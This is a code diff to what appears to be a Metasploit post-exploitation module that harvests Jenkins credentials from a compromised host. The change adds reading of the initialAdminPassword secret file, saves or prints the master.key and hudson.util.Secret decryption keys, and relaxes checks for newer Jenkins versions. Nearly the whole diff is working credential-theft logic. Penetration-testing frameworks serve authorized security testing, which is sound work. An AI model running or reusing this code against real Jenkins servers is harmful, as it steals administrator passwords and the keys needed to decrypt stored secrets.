@@ -61,15 +61,17 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_credentialsxml(file)
-    vprint_status('Parsing credentials.xml...')
+    # Newer versions of Jenkins do not create `credentials.xml` until credentials have been added via Jenkins client
+    # tested on versions 2.401.1, 2.346.3
     if exists?(file)
+      vprint_status('Parsing credentials.xml...')
       f = read_file(file)
       if datastore['STORE_LOOT']
         loot_path = store_loot('jenkins.creds', 'text/xml', session, f, file)
         vprint_status("File credentials.xml saved to #{loot_path}")
       end
     else
-      print_error('Could not read credentials.xml...')
+      vprint_status('There is no credential.xml file present')
     end
 
     xml_doc = Nokogiri::XML(f)
@@ -296,25 +298,52 @@ class MetasploitModule < Msf::Post
     when 'windows'
       master_key_path = "#{home}\\secrets\\master.key"
       hudson_secret_key_path = "#{home}\\secrets\\hudson.util.Secret"
+      initial_admin_password_path = "#{home}\\secrets\\initialAdminPassword"
     when 'nix'
       master_key_path = "#{home}/secrets/master.key"
       hudson_secret_key_path = "#{home}/secrets/hudson.util.Secret"
+      initial_admin_password_path = "#{home}/secrets/initialAdminPassword"
     end
 
-    if exists?(master_key_path) && exists?(hudson_secret_key_path)
+    # Newer versions of Jenkins have an `initialAdminPassword` which contains the initial password set when configuring Jenkins
+    # tested on versions 2.401.1, 2.346.3, 2.103
+    if exists?(initial_admin_password_path)
+      initial_admin_password = read_file(initial_admin_password_path).strip
+
+      if datastore['STORE_LOOT']
+        loot_path = store_loot('initialAdminPassword', 'text/plain', session, initial_admin_password)
+        print_status("File initialAdminPassword saved to #{loot_path}")
+      else
+        print_status("File initialAdminPassword contents: #{initial_admin_password}")
+      end
+    else
+      print_error 'Cannot read initialAdminPassword...'
+    end
+
+    if exists?(master_key_path)
       @master_key = read_file(master_key_path)
+
+      if datastore['STORE_LOOT']
+        loot_path = store_loot('master.key', 'text/plain', session, @master_key)
+        print_status("File master.key saved to #{loot_path}")
+      else
+        print_status("File master.key contents: #{@master_key}")
+      end
+    else
+      print_error 'Cannot read master.key...'
+    end
+
+    # Newer versions of Jenkins do not create `hudson.util.Secret` until credentials have been added via Jenkins client
+    # tested on versions 2.401.1, 2.346.3
+    if exists?(hudson_secret_key_path)
       @hudson_secret_key = read_file(hudson_secret_key_path)
 
       if datastore['STORE_LOOT']
-        loot_path = store_loot('master.key', 'application/octet-stream', session, @master_key)
-        vprint_status("File master.key saved to #{loot_path}")
         loot_path = store_loot('hudson.util.secret', 'application/octet-stream', session, @hudson_secret_key)
-        vprint_status("File hudson.util.Secret saved to #{loot_path}")
+        print_status("File hudson.util.Secret saved to #{loot_path}")
       end
     else
-      print_error 'Cannot read master.key or hudson.util.Secret...'
-      print_error 'Encrypted strings will not be able to be decrypted...'
-      return
+      print_error 'Cannot read hudson.util.Secret...'
     end
   end
 
